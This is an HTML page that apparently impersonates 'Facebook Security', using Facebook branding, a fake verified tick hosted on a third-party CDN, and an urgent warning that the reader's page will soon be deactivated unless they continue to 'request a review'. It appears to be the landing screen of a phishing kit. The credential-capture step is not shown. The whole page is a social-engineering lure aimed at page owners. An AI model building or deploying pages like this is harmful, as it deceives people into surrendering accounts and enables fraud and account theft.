<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Security - Account Restrictions</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
      text-align: center;
      padding-top: 80px;
      color: #000;
    }

    .logo {
      width: 50px;
    }

    .title {
      font-size: 20px;
      font-weight: bold;
      margin-top: 10px;
    }

    .service {
      font-size: 22px;
      margin-top: 10px;
    }

    .service .checkmark {
      width: 18px;
      vertical-align: middle;
      margin-left: 6px;
    }

    .warning {
      margin-top: 20px;
      font-weight: bold;
      color: #000;
    }

    .message {
      margin: 20px auto;
      width: 80%;
      font-size: 16px;
      font-weight: 500;
      line-height: 1.6;
    }

    .btn {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 10px 24px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #145dbf;
    }
  </style>
</head>
<body>

  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="logo">

  <div class="title">Facebook Security</div>
  <div class="service">
    Account Restrictions Service
    <img class="checkmark" src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/bluetick.png?v=1737135548362" alt="Verified">
  </div>

  <div class="warning">Your Page Will Be Deactivated Soon</div>

  <div class="message">
    We will walk you through several steps to request a review. You should complete these steps so that your page will not be deleted permanently.
  </div>

  <button class="btn">Continue</button>

</body>
</html>
